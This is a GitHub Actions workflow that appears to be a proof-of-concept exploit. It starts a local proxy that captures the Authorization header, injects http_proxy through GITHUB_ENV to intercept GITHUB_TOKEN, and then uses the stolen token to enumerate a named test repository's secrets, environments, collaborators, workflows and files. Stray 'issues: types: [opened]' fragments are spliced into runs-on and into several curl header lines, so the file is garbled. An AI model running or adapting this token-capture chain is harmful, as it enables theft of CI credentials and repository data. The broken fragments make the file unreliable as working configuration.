name: Full impact demonstration
on:
  issues:
    types: [opened]
  workflow_dispatch:

permissions: write-all

jobs:
  full-impact:
    runs-on:
  issues:
    types: [opened] ubuntu-latest
    steps:
      - name: Start proxy and inject
        run: |
          cat > /tmp/proxy.py << 'PYEOF'
          import http.server, socketserver
          class H(http.server.BaseHTTPRequestHandler):
              def do_GET(self):
                  auth = self.headers.get('Authorization','')
                  with open('/tmp/token.txt','w') as f: f.write(auth)
                  self.send_response(502); self.end_headers(); self.wfile.write(b"ok")
              do_POST = do_GET
              def log_message(self,*a): pass
          with socketserver.TCPServer(("127.0.0.1",18080),H) as s: s.handle_request()
          PYEOF
          python3 /tmp/proxy.py &
          sleep 1
          echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV

      - name: Token captured via proxy
        run: |
          curl --max-time 5 -sS -H "Authorization:
  issues:
    types: [opened] token $GITHUB_TOKEN" \
            "http://api.github.com/user" 2>&1 || true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: READ-ONLY PROOF with captured token
        run: |
          unset http_proxy https_proxy
          STOLEN=$(sed 's/token //' /tmp/token.txt)
          
          echo "=== 1. REPO DATA (private content if repo were private) ==="
          curl -sS -H "Authorization:
  issues:
    types: [opened] token $STOLEN" \
            "https://api.github.com/repos/toofikz/public-test-repo" | python3 -c "
import json,sys; d=json.loads(sys.stdin.read())
print(f'repo: {d.get(\"full_name\")}')
print(f'private: {d.get(\"private\")}')
print(f'default_branch: {d.get(\"default_branch\")}')
" 2>/dev/null
          
          echo ""
          echo "=== 2. SECRETS (names reveal what credentials exist) ==="
          curl -sS -H "Authorization:
  issues:
    types: [opened] token $STOLEN" \
            "https://api.github.com/repos/toofikz/public-test-repo/actions/secrets" | python3 -c "
import json,sys; d=json.loads(sys.stdin.read())
print(f'Secrets count: {d.get(\"total_count\",\"?\")}')
for s in d.get('secrets',[]): print(f'  SECRET: {s.get(\"name\")}')
" 2>/dev/null
          
          echo ""
          echo "=== 3. ENVIRONMENTS (deployment targets) ==="
          curl -sS -H "Authorization:
  issues:
    types: [opened] token $STOLEN" \
            "https://api.github.com/repos/toofikz/public-test-repo/environments" | python3 -c "
import json,sys; d=json.loads(sys.stdin.read())
print(f'Environments: {d.get(\"total_count\",\"?\")}')
for e in d.get('environments',[]): print(f'  ENV: {e.get(\"name\")} protection={e.get(\"protection_rules\",[])}')
" 2>/dev/null
          
          echo ""
          echo "=== 4. COLLABORATORS (who has access) ==="
          curl -sS -H "Authorization:
  issues:
    types: [opened] token $STOLEN" \
            "https://api.github.com/repos/toofikz/public-test-repo/collaborators" | python3 -c "
import json,sys; d=json.loads(sys.stdin.read())
if isinstance(d,list):
    for c in d[:5]: print(f'  COLLABORATOR: {c.get(\"login\")} perms={c.get(\"permissions\",{})}')
else: print(f'  {d.get(\"message\",\"?\")}')
" 2>/dev/null
          
          echo ""
          echo "=== 5. WORKFLOW FILES (CI/CD config with secret refs) ==="
          curl -sS -H "Authorization:
  issues:
    types: [opened] token $STOLEN" \
            "https://api.github.com/repos/toofikz/public-test-repo/actions/workflows" | python3 -c "
import json,sys; d=json.loads(sys.stdin.read())
print(f'Workflows: {d.get(\"total_count\",\"?\")}')
" 2>/dev/null
          
          echo ""
          echo "=== 6. GIT CONTENT (source code read) ==="
          curl -sS -H "Authorization:
  issues:
    types: [opened] token $STOLEN" \
            "https://api.github.com/repos/toofikz/public-test-repo/contents/" | python3 -c "
import json,sys; d=json.loads(sys.stdin.read())
if isinstance(d,list):
    for f in d[:10]: print(f'  FILE: {f.get(\"name\")} type={f.get(\"type\")}')
" 2>/dev/null
          
          echo ""
          echo "CRITICAL: All data above was accessed using a GITHUB_TOKEN"
          echo "captured via http_proxy MITM from GITHUB_ENV blocklist bypass."
